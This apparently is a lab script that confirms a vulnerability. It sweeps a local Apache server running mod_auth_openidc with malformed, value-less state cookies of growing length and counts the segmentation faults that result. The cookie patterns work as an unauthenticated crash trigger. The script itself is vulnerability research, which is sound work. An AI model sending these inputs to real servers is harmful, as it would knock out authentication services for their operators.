#!/usr/bin/env bash
# Non-gdb sweep for a deterministic plain-module fault from unauthenticated wire input.
# Loopback 127.0.0.1:18090 only; stops its httpd on exit. No gdb, no forced execution.
set -u
HERE="$(cd "$(dirname "$0")" && pwd)"
HTTPD=/home/mesh-home/mishe-tauftauf2shell/lab/frontier/apache2shell/build/httpd-2.4.70-install/bin/httpd
CONF="$HERE/httpd-plain.conf"
ERR="$HERE/error-plain.log"
URL=http://127.0.0.1:18090/protected
OUT="$HERE/evidence/plain-crash"
mkdir -p "$OUT"
export LD_LIBRARY_PATH="$HERE/plain-prefix/lib"
stop() { "$HTTPD" -f "$CONF" -k stop >/dev/null 2>&1; sleep 1; }
trap stop EXIT

stop
: > "$ERR"
"$HTTPD" -f "$CONF" -k start >"$OUT/start.out" 2>&1
sleep 2

{
  echo "state.c sha256: $(sha256sum "$HERE/src/mod_auth_openidc-plain/src/state.c" | awk '{print $1}')"
  echo "module sha256: $(sha256sum "$HERE/src/mod_auth_openidc-plain/src/.libs/mod_auth_openidc.so" | awk '{print $1}')"
  echo "started: $(date -u +%FT%TZ)"
} > "$OUT/summary.txt"
: > "$OUT/codes.txt"

# mode: bare (only value-less state cookie), second (value-less followed by k=v),
# safe (well-formed token), filler (no '=' in the supplied Cookie header)
for mode in bare second safe filler; do
  for n in 1 16 128 1024 4096 7800; do
    pad=$(printf 'a%.0s' $(seq 1 "$n"))
    filler=$(printf ';b%.0s,' $(seq 1 6))
    case "$mode" in
      bare)   cookie="mod_auth_openidc_state_$pad" ;;
      second) cookie="mod_auth_openidc_state_$pad;tail=value" ;;
      safe)   cookie="mod_auth_openidc_state_$pad=1" ;;
      filler) cookie="mod_auth_openidc_state_$pad$filler" ;;
    esac
    for trial in 1 2 3; do
      code=$(curl -sS --max-time 8 -o /dev/null -w '%{http_code}' -H "Cookie: $cookie" "$URL" 2>/dev/null || echo CURLERR)
      printf '%s n=%s trial=%s code=%s pid=%s\n' "$mode" "$n" "$trial" "$code" "$(cat "$HERE/httpd-plain.pid" 2>/dev/null || echo NOPID)" >>"$OUT/codes.txt"
    done
  done
done

cp "$ERR" "$OUT/error.log"
printf 'segments=%s empty=%s dispatch=%s\n' \
  "$(grep -ci 'segmentation fault\|exit signal' "$OUT/error.log" || true)" \
  "$(grep -c 'code=000\|code=CURLERR' "$OUT/codes.txt" || true)" \
  "$(grep -c 'oidc_state_cookies_process_one' "$OUT/error.log" || true)" >>"$OUT/summary.txt"
echo "finished: $(date -u +%FT%TZ)" >>"$OUT/summary.txt"
cat "$OUT/summary.txt"
